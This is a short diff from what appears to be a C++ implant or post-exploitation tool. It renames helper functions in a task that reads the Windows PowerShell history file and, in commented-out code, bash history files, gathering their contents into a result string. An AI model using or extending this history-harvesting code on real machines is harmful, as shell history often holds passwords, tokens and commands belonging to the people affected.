@@ -7,12 +7,12 @@ namespace Task
         std::wstring result = L"";
 
         // Get env paths
-        std::wstring envAppData = System::Env::GetStrings(pState->pProcs, L"%APPDATA%");
-        std::wstring envLocalAppData = System::Env::GetStrings(pState->pProcs, L"%LOCALAPPDATA%");
+        std::wstring envAppData = System::Env::EnvStringsGet(pState->pProcs, L"%APPDATA%");
+        std::wstring envLocalAppData = System::Env::EnvStringsGet(pState->pProcs, L"%LOCALAPPDATA%");
 
         // Read PowerShell history file
         std::wstring wHistoryFile = envAppData + L"\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
-        std::vector<BYTE> historyBytes = System::Fs::ReadBytesFromFile(pState->pProcs, wHistoryFile);
+        std::vector<BYTE> historyBytes = System::Fs::FileRead(pState->pProcs, wHistoryFile);
         if (historyBytes.size() > 0)
         {
             result += wHistoryFile + L"\n";
@@ -43,7 +43,7 @@ namespace Task
         //     result += historyFile + L"\n";
         //     result += std::wstring(wcslen(historyFile.c_str()), L'-') + L"\n";
 
-        //     std::vector<char> readBytes = System::Fs::ReadBytesFromFile(historyFile);
+        //     std::vector<char> readBytes = System::Fs::FileRead(pProcs, historyFile);
         //     if (readBytes.size() == 0)
         //     {
         //         result += L"No contents.\n\n";
@@ -74,7 +74,7 @@ namespace Task
         //         std::wstring fileName = fileSplit.back();
         //         if (fileName == L".bash_history")
         //         {
-        //             std::vector<char> readBytes = System::Fs::ReadBytesFromFile(fileName);
+        //             std::vector<char> readBytes = System::Fs::FileRead(pProcs, fileName);
         //             if (readBytes.size() == 0)
         //             {
         //                 result += L"No contents.\n\n";
